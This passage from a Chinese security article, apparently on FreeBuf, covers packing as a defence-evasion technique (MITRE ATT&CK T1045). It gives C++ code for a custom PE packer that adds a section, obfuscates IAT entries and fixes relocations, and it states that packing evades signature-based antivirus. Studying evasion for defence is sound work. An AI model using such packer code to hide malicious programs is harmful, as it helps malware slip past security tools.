当一个程序生成好后，很轻松的就可以利用诸如资源工具和反汇编工具对它进行修改，但如果程序员给程序加一个壳的话，那么至少这个加了壳的程序就不是那么好修改了，如果想修改就必须先脱壳。而且壳的解压缩是在内存中进行的，能检测到的杀毒软件就很少。大部分的程序是因为防止反跟踪，防止程序被人跟踪调试，防止算法程序不想被别人静态分析。加密代码和数据，保护你的程序数据的完整性。不被修改或者窥视你程序的内幕。

现在有很多加壳器，例如MPress和UPX。也可以写一个自己的加壳器。针对PE文件写加壳器需要对PE文件的格式和各种结构有充分的了解。

![23.png](https://image.3001.net/images/20191226/1577332068726.png!small)

下面是加壳器的主要代码

    
    
    //增加区段 void CPackPE::AddSection1(char*& pFileBuff, int& fileSize, const char* scnName, int scnSize) {     // 1.1 增加文件头的区段个数     GetFileHeader(pFileBuff)->NumberOfSections++;     // 1.2 配置新区段的区段头     IMAGE_SECTION_HEADER* pNewScn = NULL;     pNewScn = GetLastSection(pFileBuff);     PIMAGE_SECTION_HEADER pLastSection = pNewScn - 1;     // 1.2.1 区段的名字     memcpy(pNewScn->Name, scnName, 8);     // 1.2.2 区段的大小(实际大小/对齐后大小)     pNewScn->Misc.VirtualSize = scnSize;     pNewScn->SizeOfRawData =         aligment(scnSize,         GetOptionHeader(pFileBuff)->FileAlignment);     // 新区段的内存偏移 = 上一个区段的内存偏移+上一个区段的大小(内存粒度对齐后的大小)     pNewScn->VirtualAddress =         pLastSection->VirtualAddress +         aligment(pLastSection->Misc.VirtualSize,         GetOptionHeader(pFileBuff)->SectionAlignment);     // 设置文件偏移和文件大小         while (TRUE)         {             if (pLastSection->PointerToRawData)             {                 // 找到前一个非0的区段                 pNewScn->PointerToRawData = pLastSection->PointerToRawData +                     pLastSection->SizeOfRawData;                 break;             }             pLastSection = pLastSection - 1;         }         // 1.2.4 区段的属性(0xE00000E0)         pNewScn->Characteristics = 0xE00000E0;         // 2. 修改扩展头的映像大小         GetOptionHeader(pFileBuff)->SizeOfImage = pNewScn->VirtualAddress + pNewScn->Misc.VirtualSize;         // 3. 扩充文件数据的堆空间大小         int newSize = pNewScn->PointerToRawData + pNewScn->SizeOfRawData;         char* pNewBuff = new char[newSize];         memcpy(pNewBuff, pFileBuff, fileSize);         // 释放旧的缓冲区         delete[] pFileBuff;         // 将新的缓冲区首地址和新的文件大小赋值给形参(修改实参)         fileSize = newSize;         pFileBuff = pNewBuff; }

这里是部分壳代码

    
    
    //修复IAT void DealwithIAT() {     // 1.获取第一项iat项     // 1.获取加载基址     // 2.获取导入表的信息     g_dwImageBase = (DWORD)MyGetModuleHandleW(NULL);     PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(g_dwImageBase + g_conf.ImportTableRva);     // 3.解析导入表信息     HMODULE hMoudle;     PDWORD TableIAT = NULL;     DWORD ThunkRVA;     while (pImport->Name)     {         //获取dll基址         hMoudle = MyLoadLibraryA((char*)(pImport->Name + g_dwImageBase));         // 是否是有效的IAT         if (pImport->FirstThunk == 0)         {             ++pImport;             continue;         }         TableIAT = (PDWORD)(pImport->FirstThunk + g_dwImageBase);         if (pImport->OriginalFirstThunk == 0)         {             ThunkRVA = pImport->FirstThunk;         }         else         {             ThunkRVA = pImport->OriginalFirstThunk;         }         PIMAGE_THUNK_DATA lpThunkData = (PIMAGE_THUNK_DATA)(g_dwImageBase + ThunkRVA);         DWORD dwFunName;         while (lpThunkData->u1.Ordinal != 0)         {             // 名称导出             if ((lpThunkData->u1.Ordinal & 0x80000000) == 0)             {                 PIMAGE_IMPORT_BY_NAME lpImportByName = (PIMAGE_IMPORT_BY_NAME)(g_dwImageBase + lpThunkData->u1.Ordinal);                 dwFunName = (DWORD)&lpImportByName->Name;             }             else             {                 dwFunName = lpThunkData->u1.Ordinal & 0xFFFF;             }             DWORD dwFunAddr = (DWORD)MyGetProcAddress(hMoudle, (char*)dwFunName);             DWORD dwOldProtect = 0;             MyVirtualProtect(TableIAT, 4, PAGE_EXECUTE_READWRITE, &dwOldProtect);             dwFunAddr = EncryptFun(dwFunAddr);             *(TableIAT) = dwFunAddr;             MyVirtualProtect(TableIAT, 4, dwOldProtect, &dwOldProtect);             ++TableIAT;             ++lpThunkData;         }         ++pImport;     } }
    
    
     //修复目标PE的重定位表 void FixPEReloc() {     // 获取当前进程的加载基址     DWORD dwImageBase = (DWORD)MyGetModuleHandleW(NULL);     // 1. 修复目标PEg_dwImageBase     PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(g_conf.stcReloc.VirtualAddress + dwImageBase);//g_dwImageBase     while (pReloc->SizeOfBlock)     {         PWORD pOffsetType = (PWORD)((DWORD)pReloc + sizeof(IMAGE_BASE_RELOCATION));         DWORD dwCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);         // 修改内存属性         DWORD dwOldProtect = 0;         MyVirtualProtect((PBYTE)dwImageBase + pReloc->VirtualAddress, pReloc->SizeOfBlock, PAGE_EXECUTE_READWRITE, &dwOldProtect);         // 循环检查重定位项         for (DWORD i = 0; i < dwCount; ++i)         {             WORD dwOffset = *pOffsetType & 0xFFF;             WORD dwType = *pOffsetType >> 12;             // 去除无效的重定位项             if (!*pOffsetType) continue;             if (dwType == 3)             {                 // 获取此重定位项指向的指针                 DWORD dwPointToRVA = dwOffset + pReloc->VirtualAddress;                 PDWORD pdwPtr = (PDWORD)(dwPointToRVA + dwImageBase);                 // 计算增量值                 DWORD dwIncrement = dwImageBase - g_conf.dwDefaultImageBase;                 DWORD OldProtect = 0;                 MyVirtualProtect((PBYTE)(pdwPtr), 0x4, PAGE_EXECUTE_READWRITE, &OldProtect);                 // 修改重定位项                 *((PDWORD)pdwPtr) += dwIncrement;                 MyVirtualProtect((PBYTE)(pdwPtr), 0x4, OldProtect, &OldProtect);             }             // 下一轮循环             ++pOffsetType;         }         // 恢复内存访问属性         MyVirtualProtect((PBYTE)dwImageBase + pReloc->VirtualAddress, pReloc->SizeOfBlock, dwOldProtect, &dwOldProtect);         // 下一个重定位块         pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + pReloc->SizeOfBlock);     } }

通过加壳，修改了文件的大小，签名等信息，可以绕过基于特征的检测，防止被静态分析，是恶意代码常用的伎俩。

 **运行效果图**

目标程序被加壳后，发现PE文件多了一个区段，这里面就是壳程序

![24.png](https://image.3001.net/images/20191226/15773320921193.png!small)

**检查及限制方案**

> 使用文件扫描来查找已知的软件包装器或包装技术的工件。

 **参考链接**

> <https://attack.mitre.org/techniques/T1045/>

##  三、结语

防御逃逸所拥有的技术是MITRE
ATT&CK框架所述战术中最多的，详细介绍了防御逃逸技术的不同方向以及相同方向上的不同手段。通过上文的介绍，大家可以看到达到相同的目的可以用到不同的技术手段。当然随着防御者根据这些
**策略** 的 **更新** ，攻击者也在寻找 **更隐蔽** 的方法来绕过安全工具的 **检测** 和 **防御**
。这就要求防御者能够与时俱进，紧跟技术发展的脚步。本文到此就结束了，希望大家都能有所收获！

 ***本文作者： alphalab，转载请注明来自FreeBuf.COM**

